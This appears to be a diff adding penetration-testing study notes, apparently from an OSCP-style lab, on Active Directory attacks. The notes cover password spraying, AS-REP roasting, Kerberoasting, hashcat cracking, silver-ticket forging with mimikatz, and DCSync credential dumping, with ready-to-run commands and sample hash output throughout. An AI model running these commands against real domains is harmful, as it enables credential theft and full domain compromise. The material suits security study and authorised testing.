@@ -98,3 +98,197 @@ extract s TGT would be useful for us to authenticate against other services in t
 
 ### Password Attacks
 
+Before attacking password in AD we need to check account policies for lockout rules in place.
+This is to ensure we don't alert administrators and lock our selves out of an attack vector indefinitely.
+
+check account policy:
+```
+net accounts
+```
+
+password spray using crackmapexec:
+```
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+if we find a password we can use this to determine if we have Admin as it will append (pwn3d):
+```
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+```
+
+we can spray the credentials to find if there a system where the user is an admin:
+```
+crackmapexec smb ips.txt -u 'pete' -p 'Nexus123!' -d corp.com
+```
+
+we can also spray TGT by using kerbrute:
+```
+kerbrute passwordspray -d corp.com usernames.txt "password"
+```
+
+If you receive a network error, make sure that the encoding of **usernames.txt** is _ANSI_. You can use Notepad's _Save As_ functionality to change the encoding.
+
+
+### AS-REP Roasting
+
+The technique relies on kerberos preauthentication being disabled - without it being disabled we can not send requests on behalf of users - with it disabled we can perform offline password attacks and send requests on behalf of users in the form of AS-REQ to receive and AS-REP. The AS-REP containing the session key and TGT.
+
+It is common to find accounts with preauthentication disabled as some applications and technologies require it to function properly.
+
+enumerate for users with the preauthentication disabled:
+```
+impacket-GetNPUsers -dc-ip DC_IP  -request -outputfile hashes.asreproast domain/user
+```
+
+example usage:
+`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
+
+when we find a user we will receive the AS-REP in our output file which we can use hashcat to crack and retrieve the users password:
+```
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+We can also make use of `Rubeus` on a windows machine as an already authenticated user to automatically find vulnerable users:
+```
+.\Rubeus.exe asreproast /nowrap
+```
+
+and crack the result with hashcat
+
+If we do not find accounts with this preauth disabled - but we have genericwrite or generic all permissions against another account - we could change the password but in a real engagement we could disable preauth and AS-REP roast in a targets as-rep roast attack.
+
+
+### Kerberoasting
+
+This is attacking the TGS-REP hash. For SPNs running in the context of a user.
+
+With Kerberoasting we can request a service ticket from the DC. for a service in order to access a service hosted by an SPN. The DC doesn't check if the user is authorized to access the server. That is part of the 2nd part against the application the user is trying to access. We can attempt to crack the hash of the service ticket to gain access to the service account.
+
+The service ticket is encrypted with the SPNs password hash. if we can request the ticket and decrypt it we can use this information to crack the cleartext password of the service account.
+
+this can be done using rubeus:
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+This can also be done with impacket:
+```
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+```
+If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.
+
+and if we find any hashes we can attempt to crack them with:
+```
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+`If the SPN runs in the context of a computer account cracking is infeasible but in the context of a user account our chances are much greater`
+
+If we find an account we have generic all permissions for we could set an SPN and kerberoast their hash to crack their password.
+
+
+### Silver Tickets
+
+This utilizes a technique where we forge our own service tickets
+
+The application on the server executing in the context of the service account checks the users permissions from the group memberships included in the service ticket - however these are not verified by the application in a majority of environments. In this case the application blindly trusts the integrity of the service ticket - since it in encrypted with a password hash that is meant to only be known to the service account and the domain controller. This check is supported by `Privileged Account Certificate validation` and is an optional process between the SPN application and the domain controller. service application rarely perform PAC validation.
+
+With a service account password or its NTLM we can forge our own service ticket to access the target resource with any permissions we desire. This is known as a silver ticket. and if the SPN is used on multiple servers, the silver ticket can be leveraged  against them all.
+
+To create a silver ticket we need:
+- SPN password hash
+- Domain SID
+- Target SPN
+
+in this example we are targeting iss_service
+
+confirming we do not have a access with usual credentials:
+```
+iwr -UseDefaultCredentials http://web04
+```
+
+if we are an admin on the current machine that is running  the service we are targeting we can utilize Mimikatz to extract the hash of the service user:
+
+```
+privilege::debug
+```
+
+```
+sekurlsa::logonpasswords
+```
+
+as part of the output from mimikatz we must also get the SID:
+```
+S-1-5-21-1987370270-658905905-1781884369-1109 #1109 is the user identifier, we dont include that
+
+domain SID: S-1-5-21-1987370270-658905905-1781884369
+```
+
+we cans also get the sid with:
+```
+whoami /user
+```
+
+we can now create a silver ticket using mimikatz:
+```
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+```
+
+notice we used jeffadmin instead of jeff because we can set any permissions and groups ourselves.
+
+This ticket will then be loaded into memory and used.
+
+we can confirm this with `klist`
+
+and can retest access with:
+```
+iwr -UseDefaultCredentials http://web04
+```
+
+which should now be successful
+
+### Domain Controller Synchronization
+
+In prod environments we use redundant DCs to provide redundancy. The Directory Replication Service remote protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object like an account using the IDL_DRSGetNCChanges API.
+
+The domain controller receiving the request for an update does not check if the DC is known. it Only verifies the associated SID has appropriate privileges.
+
+We can attempt to issue a rogue update request to a dc from a user with certain rights and it will succeed.
+
+these permissions include:
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered Set
+
+Domain Admins, Enterprise Admins and Administrators group have the rights by default.
+
+If  we gain access to a user in these groups we can perform a dcsync attack. With this attack we impersonate a DC. This allows us to request any user credentials from the domain.
+
+We can do this using Mimikatz or impacket-secretsdump.
+
+using mimikatz:
+```
+lsadump::dcsync /user:corp\dave
+```
+
+with `corp\dave` we are using the `domain\user`
+
+this should dump the NTLM which we can crack with hashcat:
+```
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+`We can even perform this attack against the Administrator user`
+
+using impacket to perform the same attack:
+```
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+
+and get the following output:
+```
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+```
+we are interested in the last hash
+
